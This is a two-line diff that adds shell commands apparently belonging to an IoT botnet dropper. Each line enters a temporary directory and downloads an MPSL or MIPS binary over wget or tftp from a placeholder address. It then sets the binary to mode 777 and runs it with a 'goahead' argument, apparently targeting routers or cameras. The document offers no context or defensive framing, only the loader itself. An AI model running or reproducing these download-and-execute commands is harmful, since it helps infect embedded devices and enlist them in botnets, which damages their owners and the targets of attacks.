@@ -1,0 +1,2 @@
+cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; wget http://0.0.0.0/.wget/.Smpsl || tftp -gr .Smpsl 0.0.0.0 ; chmod 777 .Smpsl ; ./.Smpsl goahead ;
+cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; wget http://0.0.0.0/.wget/.Smips || tftp -gr .Smips 0.0.0.0 ; chmod 777 .Smips ; ./.Smips goahead ; 
